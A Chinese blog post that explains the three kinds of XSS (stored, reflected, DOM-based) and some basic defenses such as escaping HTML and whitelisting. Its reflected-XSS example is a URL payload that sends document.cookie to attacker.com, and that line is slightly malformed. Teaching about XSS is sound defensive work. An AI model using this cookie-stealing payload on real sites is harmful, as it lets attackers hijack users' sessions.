---
layout:     post
title:      "XSS攻击"
subtitle:   "web安全知识系列～"
date:       2018-06-01
author:     "Jeff"
header-img: "img/post-bg-2015.jpg"
tags:
    - JavaScript
    - WEB安全
---

## XSS

**XSS** (Cross Site Script，缩写为了区分 CSS，把 C 改为 X，X 本就有 Cross 十字的含义），中文称为“跨站脚本”。

>XSS攻击的形式千差万别，但是，它们的共同点为：将一些隐私数据像cookie、session发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。

**我们只要能把我们可控的 JavaScript 脚本内容注入到目标页面，那这个页面就存在 XSS 漏洞。**

#### XSS的三种攻击方式

- 存储型XSS（持久型）
- 反射型XSS（非持久型）
- 基于DOM的XSS

刚看到这三个术语的我是懵逼的...



通过一个场景来介绍下**存储型XSS**。例如我们进到一个留言板页面，攻击者在留言板上注入一行script脚本。

```javascript
<script> console.log('XSS') </script>
```

因为留言板需要保存这个信息，**那么这行脚本会存储在服务器的数据库中**。所以叫存储型XSS。
当下一个用户访问留言板时，他会看到之前用户的留言，包含攻击者注入的脚本。如果留言板这个网站，没有做防XSS的处理，那么浏览器会把这行脚本解析为script标签，执行里面的js脚本。
**并且，之后每一位用户访问留言板都会受到XSS攻击！**所以也叫**持久型**XSS～



而**反射型XSS**，它是非持久的。什么意思呢？相比较于存储型XSS，反射型XSS不会把脚本存储到服务端，而是通过欺骗用户自己去点击链接才能触发XSS代码，一般容易出现在搜索页面。

假如有一个搜索页面，当我们请求这个页面时，页面会把url参数展示在dom中。

比如访问`https://www.search.com?search=衣服`时，页面展示`衣服`字样，并且该页面未做防XSS处理。

那么当用户访问下面这个链接时，浏览器就会执行search参数后js语句，新建一个Image标签，请求一个接口，把用户在`https://www.search.com`下的cookie拿走了。

```javascript
https://www.search.com?search=<script>var+i=new+Image;+i.src="http://attacker.com/"document.cookie;</script>
```

由于浏览器的同源策略并不会判定Image标签跨域，所以攻击者可以拿到用户的cookie～

假如攻击者拿到我们在该网站的cookie，且我们是登陆的状态，那么攻击者就能用我们的身份做事情了。



而**基于DOM的XSS**指的是通过dom的某些属性能执行js脚本，例如 **onclick**，**innerHTML**，**document.write**等属性。反射型XSS的攻击点在于url，而基于DOM的XSS攻击点在与dom的一些属性。



#### **那么XSS如何防范呢？**

XSS攻击的模式很简单，就是把自己的代码嵌入到页面里，随页面一块执行；XSS攻击的防范也一样简单，对于网站的开发者，首先应该把精力放到对所有用户提交内容进行可靠的输入验证上。

**1、html**

只需要转义< > 即可，只要没有html标签，页面就是安全的。

**2、JS**

将要输出到js代码片断中的用户输入内容没有好的办法进行处理；仅转义少数字符不能保证去掉所有的攻击可能。因此，一般建议不要把用户产生的内容直接输出到js片断中。

如果条件所限，必须将内容直接输出，有如下方法可供选择：

1) 如果待输出的内容有特定的取值返回或者特定的格式，可以使用白名单或者正则表达式进行处理。

2) 可以将内容输出到html的隐藏标签或隐藏表单中，js通过获取标签的内容得到该内容。